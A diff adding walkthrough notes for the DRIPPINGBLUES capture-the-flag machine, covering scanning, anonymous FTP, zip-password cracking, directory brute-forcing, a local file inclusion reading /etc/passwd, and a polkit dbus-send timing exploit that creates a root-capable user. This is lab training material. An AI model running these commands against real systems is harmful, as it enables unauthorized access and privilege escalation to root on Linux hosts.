@@ -1,0 +1,61 @@
+DRIPPINGBLUES
+
+0.- install vbox and add the downloaded machine
+
+1.- run the machine and get the ip
+    sudo netdiscover
+
+2.- port scan
+    nmap -sV $IP 
+    21 ftp
+    22 ssh
+    80 http
+
+3.- use ftp to explore
+    ftp $IP
+    user = anonymous, passwd = blank
+
+4.- get the zip file
+    get file
+
+5.- get the hash of the zip and brute-force the passwd
+    zip2john 
+    john zip2john /usr/share/worldlists/rockyou.txt
+    unzip file
+
+6.- bruteforce dirs port 80
+    gobuster dir -u $IP -t 10 -w /usr/share/wordlists/dirb/big.txt
+
+7.- get ssh credentials
+    $IP/?drip=/etc/passwd
+    $IP/?drip=/etc/dripispowerful.html
+
+8.- use ssh to explore and get the flag
+    user.txt
+
+(OPTIONAL)
+9.- user privilege scalation
+    find / -perm -u=s 2> /dev/null
+    polkit has a vuln in Ubuntu 20.04 (uname -a)
+    OBJ -> Create a root permission user:
+
+    measure the time
+    time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:atenea string:"atenea the wise" int32:1
+    
+    stop the running dbus process
+    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:atenea string:"atenea the wise" int32:1 & sleep 0.008s ; kill $!
+    
+    get user id
+    id atenea
+    
+    create a password's hash
+    openssl passwd -5 ateneathewise
+
+    set a password using dbus
+    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/userid org.freedesktop.Accounts.User.SetPassword string:'hash' string:GoldenEye & sleep 0.008s ; kill $!
+
+    login 
+    su - atenea
+    sudo su
+
+    https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
